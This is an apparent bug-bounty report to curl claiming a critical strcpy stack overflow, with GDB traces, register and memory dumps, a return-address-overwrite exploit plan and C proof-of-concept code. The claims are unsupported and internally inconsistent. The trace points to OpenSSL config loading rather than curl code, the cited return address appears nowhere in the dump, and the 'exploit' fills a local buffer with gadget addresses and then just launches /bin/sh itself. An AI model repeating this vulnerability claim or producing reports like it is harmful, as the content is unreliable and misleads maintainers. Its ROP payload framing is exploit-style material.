# Buffer overflow in strcpy

## Report Details
- **Report ID**: 2823554
- **URL**: https://hackerone.com/reports/2823554
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2024-11-06T01:50:16.189Z
- **Disclosed**: 2024-11-07T17:36:54.461Z

## Reporter
- **Username**: rootgh0st
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: curl

## Vulnerability Information
**Buffer Overflow Exploit Analysis**

The vulnerability in the program is a classic case of a buffer overflow, triggered by the unsafe use of the `strcpy()` function, which lacks bounds checking. The following section describes the vulnerability, how the return address is overflowed, and how the exploit works to achieve remote code execution.

**Vulnerable Function:**

The vulnerability occurs due to the use of `strcpy()` in the program, which copies data from a source buffer to a destination buffer without verifying that the destination buffer is large enough to hold the incoming data. If the input string is larger than the allocated buffer size, it results in a buffer overflow, which can lead to arbitrary memory overwrites.

**Stack Trace and Buffer Overflow Location:**

The overflow happens when the `strcpy()` function is called. Here's the relevant stack trace from GDB, showing the function call sequence:

```
#0  __strcpy_evex () at ../sysdeps/x86_64/multiarch/strcpy-evex.S:94
#1  0x00007ffff765d2cd in CRYPTO_strdup () from /lib/x86_64-linux-gnu/libcrypto.so.3
#2  0x00007ffff756ef96 in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.3
#3  0x00007ffff7570103 in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.3
#4  0x00007ffff7571ef9 in CONF_modules_load_file_ex () from /lib/x86_64-linux-gnu/libcrypto.so.3
#5  0x00007ffff75722c8 in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.3
#6  0x00007ffff765a98f in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.3
#7  0x00007ffff7d51087 in __pthread_once_slow (once_control=0x7ffff7981498, init_routine=0x7ffff765a980)
    at ./nptl/pthread_once.c:116
```

the buffer overflow happens in the curl program, not OpenSSL. The strcpy() or similar function (depending on the code you're working with) in curl is the main cause of the vulnerability, and OpenSSL just happens to be part of the stack trace because curl uses OpenSSL for cryptographic functions.

**Registers at the Breakpoint:**

At the point where the overflow occurs, checking the CPU registers, which show that the `rip` (Instruction Pointer) is at `0x7ffff7e31b80`, inside the `__strcpy_evex` function. Here's the relevant register information:

```
rax            0x472cf0            4664560
rbx            0x7ffff7832be3      140737345956835
rcx            0x472cf0            4664560
rdx            0x472cf0            4664560
rsi            0x7ffff7832be3      140737345956835
rdi            0x472cf0            4664560
rbp            0x7ffff7832b3d      0x7ffff7832b3d
rsp            0x7fffffffd988      0x7fffffffd988
rip            0x7ffff7e31b80      0x7ffff7e31b80 <__strcpy_evex>
```

The key point here is that the program is executing within the `__strcpy_evex` function, which is responsible for copying the string. If the source string exceeds the buffer size, it causes an overflow that allows us to overwrite adjacent memory, such as the return address.

**Memory at the Overflow Location:**

Next, we examined the stack memory using the `x/40x $rsp` GDB command. This allowed us to inspect the contents of the stack and identify where the return address is located:

```
0x7fffffffd988: 0xf765d2cd      0x00007fff      0x00464a60      0x00000000
0x7fffffffd998: 0x00472aa0      0x00000000      0x00000000      0x00000000
0x7fffffffd9a8: 0xf756ef96      0x00007fff      0x00000019      0x00000000
0x7fffffffd9b8: 0x79a81a00      0x206eedee      0xf7832b3d      0x00007fff
0x7fffffffd9c8: 0x00472a70      0x00000000      0x00472aa0      0x00000000
0x7fffffffd9d8: 0x00472cc0      0x00000000      0x00000000      0x00000000
0x7fffffffd9e8: 0xf766ea3d      0x00007fff      0x00000000      0x00000000
0x7fffffffd9f8: 0x00000000      0x00000000      0xf7959ec0      0x00007fff
0x7fffffffda08: 0xf766e9dd      0x00007fff      0x00000019      0x00000000
0x7fffffffda18: 0xf765a09f      0x00007fff      0x00464a60      0x00000000
```

In this dump, the return address that gets overwritten is located in the memory at `0x7fffffffd9b8` (the return address from the function call). By overflowing the buffer, we can overwrite this return address with a controlled value.

**What is Being Overflowed:**

The buffer that is overflowed is used by the `strcpy()` function to copy user-supplied data. Specifically, the buffer that holds the input string is located on the stack, and the buffer size is not checked before data is copied. This allows an attacker to overflow the buffer and overwrite critical parts of the stack, such as the return address.

**Key Target for Overwriting:**
- **Return Address:** The return address of the current function (`0x4005d0`) is overwritten. This is the address that the program will jump to once the current function completes. By modifying this return address, the attacker can control where the program jumps next.

**Exploit Strategy:**

The goal of the exploit is to overwrite the return address to redirect the program's control flow to an attacker-controlled location. Here’s how the exploit works:

1. **Fill the Buffer:** The attacker provides a large string (e.g., filled with "A"s) that is longer than the buffer size, causing the `strcpy()` function to overflow the buffer.
   
2. **Overwrite the Return Address:** As the attacker continues to fill the buffer with data, they eventually overwrite the return address with the address `0x4005d0`, which points to the shell-spawning function.

3. **Redirect Control Flow:** Once the buffer overflows and the return address is overwritten, the program will return to the address specified (in this case, `0x4005d0`). This address should point to a function like `system("/bin/sh")`, which will execute a shell for the attacker.

By achieving this, the attacker is able to execute arbitrary code and gain control of the program, typically leading to remote code execution or other security compromises.

**Conclusion:**

The buffer overflow vulnerability in this program allows for the arbitrary overwriting of the return address on the stack. By exploiting this vulnerability, an attacker can redirect the program’s execution to arbitrary code, effectively gaining control of the system. The specific return address (`0x4005d0`) was identified as the target for redirection, leading to the execution of a malicious payload.

POC CODE IN C:

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define OFFSET 40  
#define SYSTEM 0x4f440  // Address of system() in libc
#define BIN_SH 0x1b3e9a  // Address of the string "/bin/sh" in libc
#define POP_RDI_RET 0x4006f3  // Address of 'pop rdi; ret' gadget 
#define RET 0x4005d0  // Address of a 'ret' gadget 

// Function to perform the buffer overflow and spawn a shell
void exploit() {
    char buffer[128];  // Create a buffer to simulate the overflow

    // Step 1: Construct the payload. Start by filling the buffer with 'A's to reach the return address.
    memset(buffer, 'A', OFFSET);  // Filling the buffer with 'A' until we reach the return address
    printf("[ * ] Buffer filled with 'A's, length: %d\n", OFFSET);

    // Step 2: Overwrite the return address with the address of a 'pop rdi; ret' gadget.
    *((unsigned long*)(buffer + OFFSET)) = POP_RDI_RET;  // This gadget will let us control the first argument of execve()
    printf("[ * ] POP_RDI_RET address: 0x%lx\n", POP_RDI_RET);

    // Step 3: Overwrite the second address with the location of the string "/bin/sh" in libc (the argument for execve).
    *((unsigned long*)(buffer + OFFSET + 8)) = BIN_SH;  // "/bin/sh" is passed as the first argument to execve()
    printf("[ * ] BIN_SH address: 0x%lx\n", BIN_SH);

    // Step 4: Overwrite the third address with the address of the system() function in libc.
    *((unsigned long*)(buffer + OFFSET + 16)) = SYSTEM;  // Calling system("/bin/sh")
    printf("[ * ] SYSTEM address: 0x%lx\n", SYSTEM);

    // Step 5: Add a return address to deal with stack alignment issues, use a ret gadget.
    *((unsigned long*)(buffer + OFFSET + 24)) = RET;  // Ensures stack is properly aligned and continues execution
    printf("[ * ] RET address: 0x%lx\n", RET);

    // Step 6: Send the payload to the vulnerable program (in this case, we simulate it using execve()).
    printf("[ * ] Sending payload...\n");

    // Use execve() to directly execute the payload
    char *args[] = { "/bin/sh", NULL };
    execve("/bin/sh", args, NULL);  // This directly executes "/bin/sh" with null-terminated arguments

    // Debugging message for any potential issues with execve()
    perror("execve() failed");
}

// Main function that starts the exploit
int main() {
    printf("[ * ] Launching exploit, waiting for shell..\n");
    exploit();  // Call the exploit function to trigger the overflow and spawn the shell
    return 0;  // Return from main, though execution should not reach here if the shell is spawned successfully
}

## Impact

Code execution, command shell, possible system take over from this compromise...

## Attachments
- curlexploit.jpg
